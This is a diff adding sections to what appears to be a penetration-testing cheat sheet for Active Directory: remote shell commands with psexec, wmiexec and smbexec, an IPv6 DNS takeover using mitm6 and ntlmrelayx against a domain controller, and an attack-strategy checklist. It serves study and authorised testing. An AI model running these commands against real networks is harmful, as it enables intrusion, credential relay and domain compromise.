@@ -174,7 +174,44 @@
   nc 127.0.0.1 11000
   ```
 
+### Gain Shell Access
+  1. Try psexec in metasploit: use exploit/windows/smb/psexec or psexec_psh it is worth trying with different targets.
+  2. Try psexec.py
+  ```sh
+  psexec.py <domain>/<username>:<Password>@<target>
+  ```
+  3. Try wmiexec.py
+  ```sh
+  wmiexec.py <domain>/<username>:<Password>@<target>
+  ```
+  4. Try smbexec.py
+  ```sh
+  smbexec.py <domain>/<username>:<Password>@<target>
+  ```
+### IPv6 Attacks
+#### IPv6 DNS Takeover
+ 1. Set up mitm6
+ ```sh
+ mitm6 -d <target.domain>
+  ```
+ 2. Set up ntlmrelayx
+ ```sh
+ ntlmrelayx.py -6 -t ldaps://<DC_IP> -wh fakewpad.<target.domain> -l Domain_Enum
+ ```
+ 3. Review the Domain_Enum Folder and view if users were created.
+
+### Strategies
+  1. Start with mitm6 or Responder
+  2. Run scans to generate traffic
+  3. scan for websites in scope (http_version)
+  4. Look for default Credentials on
+    * Printers
+    * Jenkings
+    * Etc
+  5. Think Outside Box   
+
 ## Attacking AD: Post-Compromise Enumeration
+
 ### Domain Enumeration with Powerview
 ### Domain Enumeration with Bloodhound
 
